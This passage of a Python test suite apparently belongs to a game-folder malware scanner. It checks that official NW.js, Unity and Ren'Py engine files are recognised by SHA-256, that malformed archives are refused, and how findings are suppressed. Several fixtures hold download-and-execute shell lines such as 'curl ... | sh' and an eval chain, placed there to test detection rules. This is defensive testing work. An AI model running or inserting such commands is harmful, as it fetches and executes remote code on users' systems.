        with zipfile.ZipFile(archive, "a", zipfile.ZIP_DEFLATED) as z:
            z.writestr("pkg/locales/tr.pak", b"\x04\x00data")
            z.writestr("pkg/empty.dat", b"")
        self.assertEqual(tool.hash_archive(archive, everything=True), {
            hashlib.sha256(program).hexdigest(): "nw.exe",
            hashlib.sha256(library).hexdigest(): "b.dll",
            hashlib.sha256(b"plain text").hexdigest(): "not a program.dll",
            hashlib.sha256(b"MZ but not named like a program").hexdigest(): "readme.txt",
            hashlib.sha256(b"\x04\x00data").hexdigest(): "locales/tr.pak"})
        self.assertEqual(len(tool.hash_archive(archive)), 2, "without it: programs only, as for the other engines")
        # (the builder has no download of its own since 2026-10-12: tools/fetch.py asks the
        # official servers, and only for what the manifest lists)
        import fetch
        for url in ("https://example.com/nwjs.zip", "http://dl.nwjs.io/v0.29.0/x.zip",
                    "https://dl.nwjs.io.example.com/x.zip"):
            with self.assertRaises(fetch.FetchError):
                fetch._open(url)
            with self.assertRaises(fetch.FetchError):
                fetch.row_for(url)
            self.assertIsNone(tool.published_sha256(url, "x.zip"), "no checksum list of the manifest")
        text = tool.render([("NW.js", "1.0", "normal, win-x64", "https://dl.nwjs.io/v1.0/a.zip",
                             "0" * 64, True)], {"1" * 64: ("nw.dll", 0)})
        module = {}
        exec(compile(text, "engine_hashes.py", "exec"), module)        # our own generated text
        self.assertEqual(module["verified"]("1" * 64), "nw.dll - NW.js 1.0 (normal, win-x64)")

    def test_the_nwjs_table_holds_every_file_of_the_archives(self):
        """The table is the official distribution (phageo, 2026-10-12; as for Inno Setup): of the
        NW.js archives every file is in it. The scanner asks it for programs - and for the
        limit note, which is not made for a file of an official archive."""
        import hashlib
        from gamescan import engine_hashes
        names = {}
        for digest, (name, index) in engine_hashes.KNOWN.items():
            names.setdefault(engine_hashes.ARCHIVES[index][0], set()).add(name)
        for wanted in ("credits.html", "icudtl.dat", "nw_100_percent.pak", "resources.pak", "locales/tr.pak",
                       "locales/ja.pak", "nw.exe", "nw.dll"):
            self.assertIn(wanted, names["NW.js"], wanted)
        for engine, others in (("Ren'Py", ["renpy.sh"]), ("Unity", [])):     # (the SDK's shell launcher)
            self.assertEqual([n for n in names[engine] if not n.lower().endswith((".exe", ".dll", ".pyd"))],
                             others, engine)
        # a file of the table that is no program gets no baseline from it: findings in it are
        # judged as before - only the limit note is left out
        from gamescan.dataflow import remote
        self.addCleanup(setattr, remote, "MAX_STEPS", remote.MAX_STEPS)
        remote.MAX_STEPS = 40
        text = EveryTracerLimitNoteTests.JS % "" + "var a = xhr.responseText; var b = a + a;\n" * 400
        found = Scanner().scan_bytes("tool.js", text.encode("utf-8"))
        self.assertEqual(len([f for f in found if f.rule_id == "SCRIPT-LIMIT-001"]), 1)
        sha = hashlib.sha256(text.encode("utf-8")).hexdigest()
        self.addCleanup(engine_hashes.KNOWN.pop, sha, None)
        engine_hashes.KNOWN[sha] = ("page.js", 0)
        found = Scanner().scan_bytes("tool.js", text.encode("utf-8"))
        self.assertEqual([f for f in found if f.rule_id == "SCRIPT-LIMIT-001"], [])
        self.assertFalse([f for f in found if "verified by SHA-256" in f.suppression_reason])
        # the sample whose page had the note: it is the official page of its NW.js version
        folder = os.path.join(SAMPLES, "MZ-01")
        if not os.path.isdir(folder):
            self.skipTest("sample MZ-01 is not on this PC")
        with open(os.path.join(folder, "credits.html"), "rb") as fh:
            page = fh.read()
        self.assertGreater(len(page), 4 * 1024 * 1024)       # (the JavaScript limit then; 32 MB since 2026-10-14)
        self.assertIn("credits.html - NW.js 0.48.4", engine_hashes.verified(hashlib.sha256(page).hexdigest()) or "")

    def test_the_renpy_table_holds_the_sdk_shell_launcher(self):
        """``renpy.sh`` of every listed SDK is in the table (phageo, 2026-10-12): a game's
        ``.sh`` launcher is a copy of it under the game's name. It is the only ``.sh`` file
        of the SDKs. A ``.sh`` file with such a hash is judged like the other hash-verified
        engine files: findings lowered, CRITICAL always shown."""
        import hashlib
        import zipfile
        from gamescan import engine_hashes
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools"))
        self.addCleanup(sys.path.pop, 0)
        import build_engine_hashes as tool
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("renpy-1.0-sdk/renpy.sh", b"#!/bin/sh\nexec python renpy.py\n")
            z.writestr("renpy-1.0-sdk/empty.sh", b"")
            z.writestr("renpy-1.0-sdk/renpy.py", b"import renpy.bootstrap\n")
            z.writestr("renpy-1.0-sdk/renpy/tool.sh", b"#!/bin/sh\necho engine folder\n")
            z.writestr("renpy-1.0-sdk/tutorial/game/a.sh", b"#!/bin/sh\necho a game\n")
        self.assertEqual(tool.hash_shell_launchers(archive),
                         {hashlib.sha256(b"#!/bin/sh\nexec python renpy.py\n").hexdigest(): "renpy.sh"})
        launchers = {digest: index for digest, (name, index) in engine_hashes.KNOWN.items() if name == "renpy.sh"}
        self.assertEqual(len(launchers), 10, "82 SDKs (since 2026-10-19), ten different launchers")
        for digest, index in launchers.items():
            self.assertEqual(engine_hashes.ARCHIVES[index][0], "Ren'Py")
            self.assertIn("renpy.sh - Ren'Py ", engine_hashes.verified(digest))
            self.assertEqual(engine_hashes.verified_shell_launcher(digest), engine_hashes.verified(digest))
        self.assertIsNone(engine_hashes.verified_shell_launcher("0" * 64))
        program = next(d for d, (name, _i) in engine_hashes.KNOWN.items() if name.lower().endswith(".exe"))
        self.assertIsNone(engine_hashes.verified_shell_launcher(program), "another file of the table is no launcher")
        # a verified launcher is judged like the other hash-verified engine files (phageo,
        # 2026-10-12): what the rules find in it is lowered - whatever the game calls it
        row = next(iter(launchers.values()))
        text = b"#!/bin/sh\ncurl -s https://example.invalid/a.sh | sh\n"

        def shown(name, strict=False):
            return [(f.rule_id, f.severity) for f in Scanner(strict=strict).scan_bytes(name, text) if not f.suppressed]

        before = shown("Game.sh")
        self.assertIn(("SH-DL-001", Severity.HIGH), before)
        sha = hashlib.sha256(text).hexdigest()
        self.addCleanup(engine_hashes.KNOWN.pop, sha, None)
        engine_hashes.KNOWN[sha] = ("renpy.sh", row)
        self.assertEqual(shown("Game.sh"), [])
        hidden = [f for f in Scanner().scan_bytes("Game.sh", text) if f.suppressed]
        self.assertEqual(len(hidden), len(before))
        for f in hidden:
            self.assertIn("official engine build, verified by SHA-256: renpy.sh - Ren'Py ", f.suppression_reason)
        self.assertEqual(shown("Game.sh", strict=True), before, "strict mode trusts nothing")
        # only as a shell script, and only that entry of the table: the same bytes named
        # .bat are judged as before, and so is a .sh file that is another file of the table
        bat = shown("Game.bat")
        engine_hashes.KNOWN.pop(sha)
        self.assertEqual(shown("Game.bat"), bat)
        engine_hashes.KNOWN[sha] = ("credits.html", 0)
        self.assertEqual(shown("Game.sh"), before)
        engine_hashes.KNOWN.pop(sha)
        # CRITICAL is always shown (rule 13): a download one verified launcher hands to
        # another, which runs it, is the chain it is anywhere else
        fill = "#!/bin/sh\nexport NEXT=$(curl -s https://example.invalid/a)\nsh step.sh\n"
        run = '#!/bin/sh\neval "$NEXT"\n'
        for script in (fill, run):
            digest = hashlib.sha256(script.encode()).hexdigest()
            self.addCleanup(engine_hashes.KNOWN.pop, digest, None)
            engine_hashes.KNOWN[digest] = ("renpy.sh", row)
        report = SharedRemoteCodeTests.scan(self, {"start.sh": fill, "step.sh": run})
        chains = [f for f in report.findings if f.rule_id == "CHAIN-REMOTE-CODE"]
        self.assertEqual([(f.severity, f.suppressed) for f in chains], [(Severity.CRITICAL, False)])
        self.assertEqual([f.rule_id for f in report.findings if not f.suppressed], ["CHAIN-REMOTE-CODE"])
        # every listed SDK: its launcher, and no other .sh file anywhere in it
        checked = 0
        for row in engine_hashes.ARCHIVES:
            path = os.path.join(ENGINE_ARCHIVES, row[3].rsplit("/", 1)[-1])
            if row[0] != "Ren'Py" or not os.path.isfile(path):
                continue
            with zipfile.ZipFile(path) as z:
                found = [name for name in z.namelist() if name.lower().endswith(".sh")]
                self.assertEqual([name.split("/", 1)[-1] for name in found], ["renpy.sh"], row[1])
                self.assertIn(hashlib.sha256(z.read(found[0])).hexdigest(), launchers, row[1])
            checked += 1
        # the samples: the launcher beside each game's program is the official file
        seen = 0
        for code in ("RPY-01", "RPY-02", "RPY-03", "RPY-04", "RPY-05", "RPY-06"):
            folder = os.path.join(SAMPLES, code)
            if not os.path.isdir(folder):
                continue
            for name in os.listdir(folder):
                if name.lower().endswith(".sh"):
                    with open(os.path.join(folder, name), "rb") as fh:
                        self.assertIn(hashlib.sha256(fh.read()).hexdigest(), launchers, code)
                    seen += 1
        if not checked or not seen:
            self.skipTest("the official SDK archives or the Ren'Py samples are not on this PC")
        self.assertEqual((checked, seen), (len(engine_hashes.renpy_versions()), 6))

    def test_real_engine_files_against_the_official_table(self):
        import hashlib
        from gamescan import engine_hashes

        def official(*parts):
            path = os.path.join(SAMPLES, *parts)
            if not os.path.isfile(path):
                self.skipTest("not on this PC: " + path)
            digest = hashlib.sha256()
            with open(path, "rb") as fh:
                for block in iter(lambda: fh.read(1 << 20), b""):
                    digest.update(block)
            return engine_hashes.verified(digest.hexdigest())

        self.assertIn("nw.exe - NW.js 0.48.4 (sdk, win-x64)", official("MZ-01", "Game.exe"),
                      "a renamed nw.exe is recognised by its content")
        self.assertIn("NW.js 0.48.4", official("MZ-01", "nw.dll"))
        self.assertIn("NW.js 0.29.0", official("MV-01", "nw.dll"))
        self.assertIsNone(official("MV-01", "Game.exe"),
                          "this launcher was altered, not just renamed: it stays unverified")
        # (the same python27.dll is in both Ren'Py SDKs; the table names the first)
        self.assertIn("python27.dll - Ren'Py", official("RPY-01", "lib", "windows-i686", "python27.dll"))
        self.assertIn("python27.dll - Ren'Py", official("RPY-02", "lib", "windows-i686", "python27.dll"))


def build_cpio(members, magic=b"070707"):
    """An ASCII cpio archive: ``[(name, data or None for a folder)]``."""
    out = b""
    for name, data in list(members) + [("TRAILER!!!", b"")]:
        raw = name.encode() + b"\x00"
        mode = 0o040755 if data is None else 0o100644
        out += magic + b"%06o%06o%06o%06o%06o%06o%06o%011o%06o%011o" % (
            0, 0, mode, 0, 0, 1, 0, 0, len(raw), len(data or b"")) + raw + (data or b"")
    return out


def build_xar(members, toc=None):
    """A xar archive: ``{path: (stored bytes, how it is stored)}``; the table of
    contents is written from the paths (folders nested) unless ``toc`` gives it."""
    heap, tree = b"", {}
    for path, (data, style) in members.items():
        node = tree
        for part in path.split("/")[:-1]:
            node = node.setdefault(part, {})
        node[path.split("/")[-1]] = (len(heap), len(data), style)
        heap += data

    def xml(node):
        out = ""
        for name, value in node.items():
            if isinstance(value, dict):
                out += "<file><name>%s</name><type>directory</type>%s</file>" % (name, xml(value))
            else:
                out += ("<file><name>%s</name><type>file</type><data><offset>%d</offset><length>%d</length>"
                        "<size>%d</size><encoding style=\"%s\"/></data></file>" % ((name,) + value[:2] + value[1:]))
        return out
    text = toc if toc is not None else ("<?xml version=\"1.0\"?><xar><toc>%s</toc></xar>" % xml(tree)).encode()
    packed = zlib.compress(text)
    return b"xar!" + struct.pack(">HHQQI", 28, 1, len(packed), len(text), 1) + packed + heap


class UnityHashTests(unittest.TestCase):
    """Unity's player files, where Unity did not sign them, are accepted by the
    SHA-256 of the official package - read with a reader of the builder's own
    (``tools/xar_reader.py``), after the package matched the MD5 Unity lists."""

    RAW = "application/octet-stream"

    def setUp(self):
        tools = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools")
        sys.path.insert(0, tools)
        self.addCleanup(sys.path.remove, tools)
        import build_engine_hashes
        import xar_reader
        self.tool, self.xar = build_engine_hashes, xar_reader
        self.program = build_pe(PLAIN_IMPORTS)
        self.library = build_dll("UnityPlayer.dll", ["x"], PLAIN_IMPORTS)
        self.members = [("./Variations", None), ("./Variations/win32/UnityPlayer.dll", self.library),
                        ("./Variations/win32/WindowsPlayer.exe", self.program),
                        ("./Variations/win32/not a program.dll", b"plain text"),
                        ("./Variations/win32/readme.txt", b"MZ but not named like a program"),
                        ("./Variations/win32/empty.dll", b"")]

    def package(self, payload, style=None, extra=None):
        members = {"Distribution": (zlib.compress(b"<x/>"), "application/x-gzip"),
                   "Support.pkg/Payload": (payload, style or self.RAW)}
        members.update(extra or {})
        path = os.path.join(self.folder(), "package.pkg")
        with open(path, "wb") as fh:
            fh.write(build_xar(members))
        return path

    def folder(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        return tmp.name

    def test_programs_are_read_from_a_gzip_or_xz_payload(self):
        import gzip
        import hashlib
        import lzma
        cpio = build_cpio(self.members)
        expected = {hashlib.sha256(self.library).hexdigest(): "UnityPlayer.dll",
                    hashlib.sha256(self.program).hexdigest(): "WindowsPlayer.exe"}
        for label, payload in (("gzip", gzip.compress(cpio)), ("xz", lzma.compress(cpio, format=lzma.FORMAT_XZ)),
                               ("stored", cpio)):
            self.assertEqual(self.xar.hash_programs(self.package(payload)), expected, label)
        # two payloads: the programs of both
        other = build_dll("mono.dll", ["y"], PLAIN_IMPORTS)
        path = self.package(gzip.compress(cpio), extra={
            "More.pkg/Payload": (gzip.compress(build_cpio([("./mono.dll", other)])), self.RAW)})
        self.assertEqual(len(self.xar.hash_programs(path)), 3)

    def test_any_other_form_is_refused_not_guessed(self):
        import bz2
        import gzip
        cpio = build_cpio(self.members)
        refused = {
            "a pbzx payload": self.package(b"pbzx" + b"\x00" * 64),
            "a bzip2 payload": self.package(bz2.compress(cpio)),
            "a payload the archive itself packed": self.package(zlib.compress(cpio), "application/x-gzip"),
            "the newer cpio form": self.package(gzip.compress(build_cpio(self.members, b"070701"))),
            "a payload that is cut off": self.package(gzip.compress(cpio)[:-40]),
            "a cpio archive without its end": self.package(gzip.compress(cpio[:-90])),
            "a header that is not octal": self.package(gzip.compress(b"070707" + b"z" * 70 + cpio)),
        }
        for label, path in refused.items():
            with self.assertRaises(self.xar.FormatError, msg=label):
                self.xar.hash_programs(path)
        files = {
            "not a xar archive": b"PK\x03\x04" + b"\x00" * 64,
            "no payload": build_xar({"Distribution": (zlib.compress(b"<x/>"), "application/x-gzip")}),
            "a payload outside the archive": build_xar({"a/Payload": (b"", self.RAW)}, toc=(
                b"<xar><toc><file><name>Payload</name><data><offset>10</offset><length>999999</length>"
                b"<encoding style=\"application/octet-stream\"/></data></file></toc></xar>")),
            "a table of contents with entities": build_xar({}, toc=(
                b"<!DOCTYPE x [<!ENTITY a \"aaaa\">]><xar><toc><file><name>&a;</name></file></toc></xar>")),
            "a table of contents that is not XML": build_xar({}, toc=b"<xar><toc>"),
            "a table of contents nested too deeply": build_xar({}, toc=(
                b"<xar><toc>" + b"<file><name>d</name>" * 40 + b"</file>" * 40 + b"</toc></xar>")),
            "a header that claims a huge table": b"xar!" + struct.pack(">HHQQI", 28, 1, 1 << 40, 1 << 40, 1),
        }
        for label, data in files.items():
            path = os.path.join(self.folder(), "package.pkg")
            with open(path, "wb") as fh:
                fh.write(data)
            with self.assertRaises(self.xar.FormatError, msg=label):
                self.xar.hash_programs(path)
        # the limits: a file, the number of files, the unpacked size
        path = self.package(gzip.compress(cpio))
        for name, value in (("MAX_MEMBER", 16), ("MAX_MEMBERS", 2), ("MAX_UNPACKED", 64), ("MAX_PAYLOADS", 0)):
            original = getattr(self.xar, name)
            setattr(self.xar, name, value)
            try:
                with self.assertRaises(self.xar.FormatError, msg=name):
                    self.xar.hash_programs(path)
            finally:
                setattr(self.xar, name, original)

    def test_the_package_must_match_the_md5_its_publisher_lists(self):
        import hashlib
        import io
        tool = self.tool
        name = "UnitySetup-Windows-Mono-Support-for-Editor-2019.3.6f1.pkg"
        self.assertRegex(tool.MD5[name], r"\A[0-9a-f]{32}\Z")
        path = os.path.join(self.folder(), name)
        with open(path, "wb") as fh:
            fh.write(b"not that package")
        with self.assertRaises(tool.BuildError):
            tool.check_md5(path, "", online=False)             # another file under the name
        unknown = os.path.join(self.folder(), "another.pkg")
        with open(unknown, "wb") as fh:
            fh.write(b"x")
        with self.assertRaises(tool.BuildError):
            tool.check_md5(unknown, "", online=False)          # no MD5 written down for it
        self.addCleanup(tool.MD5.__setitem__, name, tool.MD5[name])
        tool.MD5[name] = hashlib.md5(b"not that package").hexdigest()
        tool.check_md5(path, "", online=False)
        # online the publisher's listing has to say the same
        listing = ("[Unity]\nurl=MacEditorInstaller/Unity.pkg\nmd5=%s\n[Windows-Mono]\ntitle=x\n"
                   "url=MacEditorTargetInstaller/%s\nmd5=%%s\nsize=1\n" % ("0" * 32, name))
        # (the listing is read through tools/fetch.py - only the one the manifest names for
        # the package; a local text stands in for the server)
        import fetch
        ini = next(row[4] for row in tool.SOURCES if row[3].endswith("/" + name))
        self.addCleanup(setattr, fetch, "_open", fetch._open)
        fetch._open = lambda url: io.BytesIO((listing % tool.MD5[name]).encode())
        self.assertEqual(tool.published_md5(ini, name), tool.MD5[name])
        tool.check_md5(path, ini, online=True)
        self.assertIsNone(tool.published_md5("https://download.unity3d.com/x.ini", name),
                          "a listing the manifest does not name is not read")
        fetch._open = lambda url: io.BytesIO((listing % ("1" * 32)).encode())
        with self.assertRaises(tool.BuildError):
            tool.check_md5(path, ini, online=True)
        fetch._open = lambda url: io.BytesIO(b"[Unity]\nurl=other.pkg\nmd5=%s\n" % (b"2" * 32))
        self.assertIsNone(tool.published_md5(ini, name))

    def test_only_unitys_own_server_is_asked(self):
        tool = self.tool
        unity = [row for row in tool.SOURCES if row[0] == "Unity"]
        self.assertTrue(unity)
        for _engine, _version, _build, url, listing in unity:
            self.assertTrue(url.startswith("https://download.unity3d.com/download_unity/"), url)
            self.assertTrue(listing.startswith("https://download.unity3d.com/download_unity/"), listing)
            self.assertIn(url.rsplit("/", 1)[-1], tool.MD5)
        import fetch
        for url in ("http://download.unity3d.com/a.pkg", "https://download.unity3d.com.example.invalid/a.pkg",
                    "https://unity3d.example.invalid/a.pkg"):
            with self.assertRaises(fetch.FetchError):
                fetch._open(url)

    @slow
    def test_the_table_names_the_package_and_its_md5(self):
        from gamescan import engine_hashes
        rows = [i for i, row in enumerate(engine_hashes.ARCHIVES) if row[0] == "Unity"]
        # 2019.2.6f1 (the version of UNI-01) was added on 2026-10-11, at the end
        self.assertEqual([engine_hashes.ARCHIVES[i][1:3] for i in rows],
                         [("2019.3.6f1", "Windows Mono player support"), ("2019.2.6f1", "Windows Mono player support")])
        # (it was the last row then; the Ren'Py SDKs added on 2026-10-19 come after it)
        self.assertEqual(rows[-1], len(engine_hashes.ARCHIVES) - 1 - 69, "a new archive goes at the end")
        self.assertEqual({row[0] for row in engine_hashes.ARCHIVES[rows[-1] + 1:]}, {"Ren'Py"})
        self.assertEqual(engine_hashes.ARCHIVE_MD5,
                         {row: self.tool.MD5[engine_hashes.ARCHIVES[row][3].rsplit("/", 1)[-1]] for row in rows})
        for row in rows:
            self.assertFalse(engine_hashes.ARCHIVES[row][5], "Unity lists no SHA-256: never 'confirmed'")
            self.assertTrue(engine_hashes.ARCHIVES[row][3].startswith("https://download.unity3d.com/download_unity/"))
            mine = {digest: name for digest, (name, index) in engine_hashes.KNOWN.items() if index == row}
            self.assertIn("UnityPlayer.dll", mine.values())
            self.assertIn("mono-2.0-bdwgc.dll", mine.values())
            # the kept official package gives exactly these entries (read, never copied into the project)
            path = os.path.join(ENGINE_ARCHIVES, engine_hashes.ARCHIVES[row][3].rsplit("/", 1)[-1])
            if not os.path.isfile(path):
                self.skipTest("the official Unity package is not on this PC")
            self.tool.check_md5(path, "", online=False)
            found = self.xar.hash_programs(path)
            self.assertEqual({d: n for d, n in found.items() if d in mine}, mine)
            self.assertEqual([d for d in found if d not in engine_hashes.KNOWN], [])

    @unittest.skipUnless(os.path.isdir(os.path.join(SAMPLES, "UNI-01")), "needs the real samples")
    @slow
    def test_the_second_unity_version_covers_its_sample(self):
        """UNI-01 (Unity 2019.2.6f1): its player files are the official ones, also the one
        Unity did not sign - which had a "not signed" note before the table knew it."""
        import hashlib
        from gamescan import engine_hashes
        folder = os.path.join(SAMPLES, "UNI-01")
        engine = ("UnityPlayer.dll", "UnityCrashHandler64.exe",
                  "MonoBleedingEdge/EmbedRuntime/mono-2.0-bdwgc.dll",
                  "MonoBleedingEdge/EmbedRuntime/MonoPosixHelper.dll")
        for rel in engine:
            with open(os.path.join(folder, *rel.split("/")), "rb") as fh:
                official = engine_hashes.verified(hashlib.sha256(fh.read()).hexdigest())
            self.assertIn("Unity 2019.2.6f1 (Windows Mono player support)", official or "", rel)
        report = Scanner(memory=False).scan(folder)
        self.assertEqual(report.verdict, "LIKELY SAFE", "as before the table knew these files")
        self.assertEqual([f for f in report.active if f.severity >= Severity.MEDIUM], [])
        self.assertFalse([f for f in report.findings if f.rule_id == "ENGINE-002" and f.file in engine])

    @unittest.skipUnless(os.path.isdir(os.path.join(SAMPLES, "UNI-02")), "needs the real samples")
    @slow
    def test_real_unsigned_unity_files_are_the_official_ones(self):
        import hashlib
        from gamescan import engine_hashes
        folder = os.path.join(SAMPLES, "UNI-02")
        engine = ("UnityPlayer.dll", "UnityCrashHandler32.exe",
                  "MonoBleedingEdge/EmbedRuntime/mono-2.0-bdwgc.dll",
                  "MonoBleedingEdge/EmbedRuntime/MonoPosixHelper.dll")
        for rel in engine:
            with open(os.path.join(folder, *rel.split("/")), "rb") as fh:
                official = engine_hashes.verified(hashlib.sha256(fh.read()).hexdigest())
            self.assertIn("Unity 2019.3.6f1 (Windows Mono player support)", official or "", rel)
        programs = [n for n in os.listdir(folder) if n.lower().endswith(".exe") and not n.startswith("Unity")]
        with open(os.path.join(folder, programs[0]), "rb") as fh:
            self.assertIsNone(engine_hashes.verified(hashlib.sha256(fh.read()).hexdigest()),
                              "the game's own program carries its icon: it is not in the table")
        report = Scanner(memory=False).scan(folder)
        self.assertEqual(report.verdict, "LIKELY SAFE", "SUSPICIOUS before the table knew these files")
        self.assertEqual([f for f in report.active if f.severity >= Severity.MEDIUM], [])
        covered = {(f.rule_id, f.file) for f in report.suppressed
                   if "official engine build, verified by SHA-256" in f.suppression_reason}
        for expected in (("INJ-001", engine[2]), ("LOL-001", engine[0]), ("NET-PE-001", engine[1])):
            self.assertIn(expected, covered)
        self.assertFalse([f for f in report.findings if f.rule_id == "ENGINE-002" and f.file in engine])
        # one changed byte, scanned from memory: not that file, judged like any unknown program
        with open(os.path.join(folder, engine[1]), "rb") as fh:
            changed = bytearray(fh.read())
        changed[-1] ^= 0x01
        found = Scanner().scan_bytes(engine[1], bytes(changed))
        self.assertEqual([f.severity for f in active(found, "NET-PE-001")], [Severity.MEDIUM])
        self.assertFalse([f for f in found if "verified by SHA-256" in f.suppression_reason])


class RenPyEngineTests(unittest.TestCase):
    """Ren'Py's own scripts are recognised by their content, not by their folder."""

    @staticmethod
    def rpyc(strings):
        body = zlib.compress(pickle.dumps(list(strings), 2))
        return b"RENPY RPC2" + struct.pack("<III", 1, 34, len(body)) + b"\0" * 12 + body

    def engine(self, version_files, scripts):
        """A folder with a ``renpy`` directory; returns a function that gives
        the status of one of its files."""
        from gamescan.handlers import renpy_engine
        from gamescan.models import FileContext
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        for rel, data in dict(version_files, **scripts).items():
            path = os.path.join(tmp.name, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(data if isinstance(data, bytes) else data.encode())

        def status(rel, inside=""):
            import hashlib
            path = os.path.join(tmp.name, *rel.split("/"))
            with open(path, "rb") as fh:
                data = fh.read()
            return renpy_engine.status(FileContext(
                path=path, relpath=inside + rel, data=data, size=len(data),
                sha256=hashlib.sha256(data).hexdigest()))
        return status

    def test_compiled_script_is_compared_by_what_it_contains(self):
        from gamescan.unpack import rpyc
        plain = self.rpyc(["label start", "x = 1"])
        here = self.rpyc(["label start", "D:\\Documents\\sdk-6.99/renpy/common/00start.rpy", "x = 1"])
        there = self.rpyc(["label start", "/home/tom/renpy/common/00start.rpy", "x = 1"])
        self.assertIsNotNone(rpyc.content_key(plain))
        self.assertEqual(rpyc.content_key(here), rpyc.content_key(plain), "the compiler's folder")
        self.assertEqual(rpyc.content_key(there), rpyc.content_key(plain))
        self.assertNotEqual(here, there, "the files themselves differ")
        self.assertEqual(rpyc.content_key(self.rpyc(["x = 1", "label start"])), rpyc.content_key(plain),
                         "the same strings in another order (names from an unordered collection)")
        self.assertNotEqual(rpyc.content_key(self.rpyc(["label start", "x = 1", "y = 2"])),
                            rpyc.content_key(plain), "one string more")
        for changed in (["label start", "x = 2"],
                        ["label start", "x = 1", "os.system('a') or 'renpy/common/00start.rpy'"],
                        ["label start", "x = 1", "renpy/common/00start.rpy; import os"],
                        ["label start", "x = 1", "f(renpy/common/00start.rpy)"]):
            self.assertNotEqual(rpyc.content_key(self.rpyc(changed)), rpyc.content_key(plain), changed)
        self.assertIsNone(rpyc.content_key(b"RENPY RPC2 garbage"), "unreadable: nothing is claimed")

    def test_status_of_an_engine_file(self):
        import hashlib
        from gamescan import engine_hashes
        from gamescan.handlers import renpy_engine
        from gamescan.unpack import rpyc
        self.addCleanup(renpy_engine._versions.clear)
        official, compiled = b"init python:\n    pass\n", self.rpyc(["official code", "C:\\a/renpy/common/00a.rpy"])
        self.addCleanup(engine_hashes.SCRIPTS.pop, hashlib.sha256(official).hexdigest(), None)
        engine_hashes.SCRIPTS[hashlib.sha256(official).hexdigest()] = ("renpy/common/00a.rpy", 9)
        key = rpyc.content_key(self.rpyc(["official code", "E:\\sdk/renpy/common/00a.rpy"]))
        self.addCleanup(engine_hashes.SCRIPT_CONTENT.pop, key, None)
        engine_hashes.SCRIPT_CONTENT[key] = ("renpy/common/00a.rpyc", 9)
        scripts = {"renpy/common/00a.rpy": official, "renpy/common/00a.rpyc": compiled,
                   "renpy/common/00b.rpy": b"init python:\n    import os\n",
                   "renpy/common/00b.rpyc": self.rpyc(["other code"]),
                   "lib/python2.7/site.py": b"x = 1\n", "game/script.rpy": official}
        listed = self.engine({"renpy/__init__.py": "version_tuple = (7, 3, 5, vc_version)\n",
                              "renpy/vc_version.py": "vc_version = 606\n"}, scripts)
        V, M, U = renpy_engine.VERIFIED, renpy_engine.MISMATCH, renpy_engine.UNKNOWN
        self.assertEqual(listed("renpy/common/00a.rpy"), V, "the official file, by its SHA-256")
        self.assertEqual(listed("renpy/common/00a.rpyc"), V, "compiled on another PC, same content")
        self.assertEqual(listed("renpy/common/00b.rpy"), M, "a listed version, and not its file")
        self.assertEqual(listed("renpy/common/00b.rpyc"), M)
        self.assertEqual(listed("lib/python2.7/site.py"), M, "the bundled Python library too")
        self.assertEqual(listed("game/script.rpy"), "", "not an engine file, whatever it contains")
        self.assertEqual(listed("renpy/common/00b.rpy", inside="archive.rpa!"), "",
                         "inside an archive: not the engine folder")
        # ... but an official script is known by its content there, wherever it sits (phageo,
        # 2026-10-17, fifty-ninth message)
        self.assertEqual(listed("renpy/common/00a.rpy", inside="archive.rpa!"), V)
        self.assertEqual(listed("renpy/common/00a.rpyc", inside="setup.exe!"), V)
        self.assertEqual(listed("game/script.rpy", inside="game.zip!"), V)
        for files in ({"renpy/__init__.py": "version_tuple = (9, 9, 9, vc_version)\n"},
                      {"renpy/__init__.py": "# nothing about a version\n"}, {}):
            unlisted = self.engine(files, scripts)
            self.assertEqual(unlisted("renpy/common/00b.rpy"), U, files)
            self.assertEqual(unlisted("renpy/common/00a.rpy"), V, "the hash needs no version")
        newer = self.engine({"renpy/vc_version.py": "version = '8.2.3.24061702'\nofficial = True\n"},
                            scripts)
        self.assertEqual(newer("renpy/common/00b.rpy"), M, "the newer way of naming the version")
        self.assertTrue(renpy_engine.version_listed("7.3.5.606"))
        self.assertTrue(renpy_engine.version_listed("6.99.12.4.2187"))
        for version in ("7.3.50.1", "7.3", "", None, "17.3.5"):
            self.assertFalse(renpy_engine.version_listed(version), version)

    def test_changed_engine_file_gets_a_visible_note(self):
        import hashlib
        from gamescan import engine_hashes, i18n
        from gamescan.handlers import renpy_engine
        self.addCleanup(renpy_engine._versions.clear)
        changed = b"import subprocess\nsubprocess.Popen(cmd)\n"

        def scan(version_line, relpath="renpy/main.py", strict=False):
            with tempfile.TemporaryDirectory() as tmp:
                path = os.path.join(tmp, *relpath.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                os.makedirs(os.path.join(tmp, "renpy"), exist_ok=True)
                with open(os.path.join(tmp, "renpy", "vc_version.py"), "w") as fh:
                    fh.write("vc_version = 606\n")
                with open(os.path.join(tmp, "renpy", "__init__.py"), "w") as fh:
                    fh.write(version_line)
                with open(path, "wb") as fh:
                    fh.write(changed)
                renpy_engine._versions.clear()
                return Scanner(strict=strict).scan_bytes(relpath, changed, path=path)

        listed, unlisted = "version_tuple = (7, 3, 5, vc_version)\n", "version_tuple = (6, 18, 3, vc_version)\n"
        found = scan(listed)
        note, = active(found, "ENGINE-003")
        self.assertEqual((note.severity, note.file), (Severity.LOW, "renpy/main.py"))
        self.assertEqual(note.evidence, "this engine file differs from the official version 7.3.5.606")
        self.assertEqual(note.title, "Engine file differs from the official version")
        # only the note is new: the file's ordinary findings keep the folder's trust
        self.assertEqual([f.rule_id for f in active(found)], ["ENGINE-003"])
        self.assertTrue(any("Ren'Py engine runtime" in f.suppression_reason for f in suppressed(found)))
        i18n.set_language("tr")
        self.addCleanup(i18n.set_language, "en")
        self.assertEqual(i18n.evidence(note), "bu motor dosyası resmi 7.3.5.606 sürümünden farklı")
        self.assertEqual(i18n.title(note), "Motor dosyası resmi sürümden farklı")
        i18n.set_language("en")
        self.assertEqual(len(active(scan(listed, strict=True), "ENGINE-003")), 1, "in strict mode too")
